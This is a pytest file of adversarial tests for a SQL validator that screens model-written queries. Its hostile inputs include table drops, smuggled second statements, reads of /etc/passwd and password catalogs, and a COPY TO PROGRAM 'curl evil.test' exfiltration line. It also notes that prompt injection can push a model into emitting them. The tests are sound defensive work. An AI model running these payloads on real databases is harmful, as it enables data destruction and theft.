"""SQL validator tests.

The validator is the application's first line of defence, so these are adversarial
by design. Several cases exist specifically to demonstrate what AST parsing gets
right and pattern matching gets wrong.
"""

from __future__ import annotations

import pytest

from app.models import TABLE_LOAD_ORDER
from app.services.sql.validator import validate

#: The warehouse's tables, derived rather than restated: a table added to
#: the model layer must not silently fall outside the validator's allow-list.
WAREHOUSE = frozenset(TABLE_LOAD_ORDER)


class TestValidQueries:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 1",
            "SELECT * FROM orders",
            "SELECT status, COUNT(*) FROM orders GROUP BY status",
            "SELECT o.id FROM orders o JOIN customers c ON c.id = o.customer_id",
            "SELECT SUM(total_amount) FROM orders WHERE status = 'completed'",
            "SELECT * FROM orders ORDER BY order_date DESC LIMIT 10",
            "SELECT * FROM orders WHERE order_date BETWEEN '2025-01-01' AND '2025-12-31'",
        ],
    )
    def test_ordinary_selects_are_accepted(self, sql):
        assert validate(sql, allowed_tables=WAREHOUSE).is_valid

    def test_ctes_are_accepted(self):
        result = validate(
            """
            WITH monthly AS (
                SELECT date_trunc('month', order_date) AS m, SUM(total_amount) AS rev
                FROM orders GROUP BY 1
            )
            SELECT m, rev, LAG(rev) OVER (ORDER BY m) FROM monthly
            """,
            allowed_tables=WAREHOUSE,
        )
        assert result.is_valid

    def test_a_cte_name_is_not_mistaken_for_a_table(self):
        """`FROM monthly` refers to the CTE, not a table called monthly. Treating
        it as one would make the allow-list reject valid SQL."""
        result = validate(
            "WITH monthly AS (SELECT 1 AS x FROM orders) SELECT * FROM monthly",
            allowed_tables=WAREHOUSE,
        )
        assert result.is_valid
        assert result.tables == frozenset({"orders"})

    def test_window_functions_are_accepted(self):
        assert validate(
            "SELECT id, RANK() OVER (PARTITION BY status ORDER BY total_amount DESC) FROM orders",
            allowed_tables=WAREHOUSE,
        ).is_valid

    def test_unions_are_accepted(self):
        assert validate(
            "SELECT id FROM orders UNION ALL SELECT id FROM customers",
            allowed_tables=WAREHOUSE,
        ).is_valid

    def test_subqueries_are_accepted(self):
        assert validate(
            "SELECT * FROM orders WHERE customer_id IN "
            "(SELECT id FROM customers WHERE customer_segment = 'Enterprise')",
            allowed_tables=WAREHOUSE,
        ).is_valid

    def test_referenced_tables_are_reported(self):
        result = validate(
            "SELECT * FROM orders o JOIN customers c ON c.id = o.customer_id",
            allowed_tables=WAREHOUSE,
        )
        assert result.tables == frozenset({"orders", "customers"})


class TestWriteStatementsRejected:
    @pytest.mark.parametrize(
        ("sql", "keyword"),
        [
            ("INSERT INTO orders (id) VALUES (1)", "INSERT"),
            ("UPDATE orders SET total_amount = 0", "UPDATE"),
            ("DELETE FROM orders", "DELETE"),
            ("DROP TABLE orders", "DROP"),
            ("ALTER TABLE orders ADD COLUMN x int", "ALTER"),
            ("CREATE TABLE evil (id int)", "CREATE"),
            ("TRUNCATE orders", "TRUNCATE"),
            ("GRANT ALL ON orders TO PUBLIC", "GRANT"),
            ("MERGE INTO orders USING customers ON true WHEN MATCHED THEN DELETE", "MERGE"),
        ],
    )
    def test_mutating_statement_is_rejected(self, sql, keyword):
        result = validate(sql, allowed_tables=WAREHOUSE)
        assert not result.is_valid
        assert keyword in result.reason.upper()

    @pytest.mark.parametrize(
        "sql",
        [
            "REVOKE ALL ON orders FROM PUBLIC",
            "VACUUM FULL orders",
            "SET ROLE postgres",
            "COPY orders TO '/tmp/stolen.csv'",
            "CALL some_procedure()",
        ],
    )
    def test_administrative_statement_is_rejected(self, sql):
        assert not validate(sql, allowed_tables=WAREHOUSE).is_valid

    def test_select_into_is_rejected(self):
        """SELECT ... INTO creates a table, so it is a write dressed as a read."""
        result = validate("SELECT * INTO stolen FROM customers", allowed_tables=WAREHOUSE)
        assert not result.is_valid
        assert "INTO" in result.reason.upper()

    def test_a_write_hidden_inside_a_cte_is_rejected(self):
        """A genuine PostgreSQL feature and a genuine escape route: a data-
        modifying CTE makes the statement a SELECT at the top level while still
        deleting rows."""
        result = validate(
            "WITH removed AS (DELETE FROM orders RETURNING *) SELECT * FROM removed",
            allowed_tables=WAREHOUSE,
        )
        assert not result.is_valid

    def test_locking_clause_is_rejected(self):
        assert not validate("SELECT * FROM orders FOR UPDATE", allowed_tables=WAREHOUSE).is_valid


class TestParsingBeatsPatternMatching:
    """The cases that justify using a parser instead of a regex.

    Each of these is wrong under naive pattern matching — either a false
    positive that blocks legitimate analysis, or a false negative that lets an
    attack through.
    """

    def test_a_forbidden_keyword_inside_a_string_literal_is_harmless(self):
        """FALSE POSITIVE under regex. This query deletes nothing; the words are
        data. A `DROP TABLE` pattern would reject a legitimate query."""
        result = validate(
            "SELECT * FROM orders WHERE order_number = 'DROP TABLE customers'",
            allowed_tables=WAREHOUSE,
        )
        assert result.is_valid

    def test_a_column_alias_containing_a_keyword_is_harmless(self):
        result = validate('SELECT COUNT(*) AS "delete_count" FROM orders', allowed_tables=WAREHOUSE)
        assert result.is_valid

    def test_a_semicolon_inside_a_literal_does_not_split_the_statement(self):
        """FALSE POSITIVE under naive splitting: splitting on ';' mangles this
        into two invalid fragments."""
        result = validate(
            "SELECT * FROM orders WHERE order_number = 'a; DROP TABLE x'",
            allowed_tables=WAREHOUSE,
        )
        assert result.is_valid

    def test_a_second_statement_is_rejected(self):
        """FALSE NEGATIVE under a 'starts with SELECT' check."""
        result = validate("SELECT 1; DROP TABLE orders", allowed_tables=WAREHOUSE)
        assert not result.is_valid

    def test_a_statement_smuggled_behind_a_comment_is_rejected(self):
        """FALSE NEGATIVE under a leading-keyword check."""
        result = validate("SELECT 1;/* harmless */DELETE FROM orders", allowed_tables=WAREHOUSE)
        assert not result.is_valid

    def test_a_leading_comment_does_not_disguise_a_write(self):
        result = validate("/* SELECT */ DELETE FROM orders", allowed_tables=WAREHOUSE)
        assert not result.is_valid

    def test_case_and_whitespace_cannot_evade_detection(self):
        for variant in (
            "dElEtE   FROM orders",
            "DELETE\n\tFROM\n\torders",
            "  delete from orders  ",
        ):
            assert not validate(variant, allowed_tables=WAREHOUSE).is_valid


class TestDangerousFunctions:
    @pytest.mark.parametrize(
        "function",
        [
            "pg_read_file('/etc/passwd')",
            "pg_ls_dir('/')",
            "pg_sleep(60)",
            "lo_import('/etc/shadow')",
            "pg_terminate_backend(1)",
            "current_setting('is_superuser')",
            "dblink('host=evil', 'SELECT 1')",
        ],
    )
    def test_filesystem_and_admin_functions_are_rejected(self, function):
        result = validate(f"SELECT {function}", allowed_tables=WAREHOUSE)
        assert not result.is_valid
        assert "not permitted" in result.reason

    def test_ordinary_analytical_functions_are_allowed(self):
        """The block list must not catch legitimate SQL."""
        assert validate(
            "SELECT date_trunc('month', order_date), SUM(total_amount), "
            "COALESCE(AVG(subtotal), 0), NULLIF(COUNT(*), 0) "
            "FROM orders GROUP BY 1",
            allowed_tables=WAREHOUSE,
        ).is_valid


class TestSystemCatalogAccess:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM pg_catalog.pg_authid",
            "SELECT * FROM information_schema.tables",
            "SELECT rolname FROM pg_roles",
            "SELECT * FROM pg_shadow",
            "SELECT * FROM pg_settings",
        ],
    )
    def test_catalog_access_is_rejected(self, sql):
        """Catalogs expose roles, password hashes and server configuration.
        None of it is business analytics."""
        assert not validate(sql, allowed_tables=WAREHOUSE).is_valid


class TestTableAllowList:
    def test_unknown_table_is_rejected(self):
        """Catches a hallucinated relation before the database does."""
        result = validate("SELECT * FROM sales_facts", allowed_tables=WAREHOUSE)
        assert not result.is_valid
        assert "sales_facts" in result.reason

    def test_rejection_message_lists_the_real_tables(self):
        """Useful feedback to the repair loop, not just a refusal."""
        result = validate("SELECT * FROM nope", allowed_tables=WAREHOUSE)
        assert "orders" in result.reason

    def test_a_restricted_allow_list_rejects_out_of_scope_tables(self):
        """Retrieval narrows the allow-list, so a query touching a table that
        was never retrieved is a sign the model went off-piste."""
        result = validate("SELECT * FROM employees", allowed_tables=frozenset({"orders"}))
        assert not result.is_valid

    def test_no_allow_list_skips_the_check(self):
        assert validate("SELECT * FROM anything").is_valid


class TestRowLimit:
    def test_limit_is_added_when_missing(self):
        result = validate("SELECT * FROM orders", allowed_tables=WAREHOUSE, max_rows=100)
        assert result.limit_applied
        assert "LIMIT 100" in result.normalized_sql

    def test_an_existing_smaller_limit_is_preserved(self):
        result = validate("SELECT * FROM orders LIMIT 10", allowed_tables=WAREHOUSE, max_rows=100)
        assert not result.limit_applied
        assert "LIMIT 10" in result.normalized_sql

    def test_an_existing_larger_limit_is_lowered(self):
        result = validate(
            "SELECT * FROM orders LIMIT 99999", allowed_tables=WAREHOUSE, max_rows=100
        )
        assert result.limit_applied
        assert "LIMIT 100" in result.normalized_sql

    def test_limit_binds_to_the_whole_union_not_its_last_branch(self):
        """Appending ' LIMIT n' as text would bind to the final SELECT only,
        silently returning more rows than the cap allows."""
        result = validate(
            "SELECT id FROM orders UNION ALL SELECT id FROM customers",
            allowed_tables=WAREHOUSE,
            max_rows=50,
        )
        assert result.is_valid
        assert result.normalized_sql.rstrip().endswith("LIMIT 50")

    def test_no_limit_is_added_when_none_is_configured(self):
        result = validate("SELECT * FROM orders", allowed_tables=WAREHOUSE)
        assert not result.limit_applied
        assert "LIMIT" not in result.normalized_sql.upper()


class TestMalformedInput:
    @pytest.mark.parametrize("sql", ["", "   ", "\n\t"])
    def test_empty_input_is_rejected(self, sql):
        result = validate(sql)
        assert not result.is_valid
        assert "empty" in result.reason.lower()

    def test_unparseable_input_is_rejected_with_a_usable_message(self):
        result = validate("SELECT FROM WHERE GROUP", allowed_tables=WAREHOUSE)
        assert not result.is_valid

    def test_prose_is_rejected(self):
        """The model sometimes answers in English instead of SQL."""
        result = validate(
            "I cannot answer that question with the available schema.",
            allowed_tables=WAREHOUSE,
        )
        assert not result.is_valid

    def test_a_markdown_fence_is_rejected(self):
        """A leading ```sql fence is a common model output artefact and must not
        be silently executed."""
        result = validate("```sql\nSELECT 1\n```", allowed_tables=WAREHOUSE)
        assert not result.is_valid


class TestResultTruthiness:
    def test_result_is_falsy_when_invalid(self):
        assert not validate("DELETE FROM orders")

    def test_result_is_truthy_when_valid(self):
        assert validate("SELECT 1")


class TestPromptInjectionPayloads:
    """Payloads a hostile user might try to get through the model.

    The model may well be talked into emitting these. The validator is what
    makes that not matter.
    """

    @pytest.mark.parametrize(
        "payload",
        [
            "DROP TABLE customers;",
            "DELETE FROM customers WHERE 1=1",
            "SELECT * FROM orders; DROP TABLE customers;",
            "UPDATE customers SET email = 'x'",
            "SELECT * FROM pg_authid",
            "SELECT pg_read_file('/etc/passwd')",
            "TRUNCATE TABLE orders CASCADE",
            "CREATE USER hacker SUPERUSER",
            "SELECT * FROM orders INTO OUTFILE '/tmp/x'",
            "COPY (SELECT * FROM customers) TO PROGRAM 'curl evil.test'",
        ],
    )
    def test_hostile_payload_is_rejected(self, payload):
        result = validate(payload, allowed_tables=WAREHOUSE)
        assert not result.is_valid, f"SECURITY: payload accepted: {payload}"

    def test_rejection_reason_never_leaks_internals(self):
        """A refusal must not become an information-disclosure channel."""
        result = validate("SELECT * FROM pg_authid", allowed_tables=WAREHOUSE)
        lowered = result.reason.lower()
        assert "password" not in lowered
        assert "postgresql://" not in lowered
